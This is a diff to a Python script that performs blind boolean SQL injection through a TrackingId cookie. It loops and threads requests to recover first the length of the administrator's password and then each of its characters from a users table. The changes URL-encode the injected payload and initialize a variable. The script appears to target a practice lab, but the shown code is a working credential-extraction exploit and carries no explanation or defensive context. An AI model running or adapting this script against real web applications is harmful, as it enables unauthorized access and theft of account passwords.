@@ -34,7 +34,7 @@ ascii_chart = [char for char in range(32,127)] # ascii character iterator that i
 
 
 def get_password_length(num: int) -> int:
-    query = f"query' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')='{num}"
+    query = f"query'+OR+(SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')='{num}"
     cookies = {'TrackingId': query}
     r = requests.get(base_uri, cookies=cookies)
     if 'Welcome' in r.text:
@@ -42,7 +42,7 @@ def get_password_length(num: int) -> int:
 
 
 def get_password(subnum: int, char: int) -> str:
-        query = f"query' OR (SELECT ASCII(SUBSTRING(password,{subnum},1)) FROM users WHERE username='administrator')='{char}"
+        query = f"query'+OR+(SELECT+ASCII(SUBSTRING(password,{subnum},1))+FROM+users+WHERE+username='administrator')='{char}"
         cookies = {'TrackingId' : query}
         r = requests.get(base_uri, cookies=cookies)
         if 'Welcome' in r.text:
@@ -79,6 +79,7 @@ def threadExecutor(function: "function", iterator: list) -> list:
 
 def main() -> None:
     # Get the length of the administrator password
+    password_length = ''
     for result in threadExecutor(get_password_length, length_check):
         if result:
             print(f"[+] Found admin password length of {result}. Getting admin password")
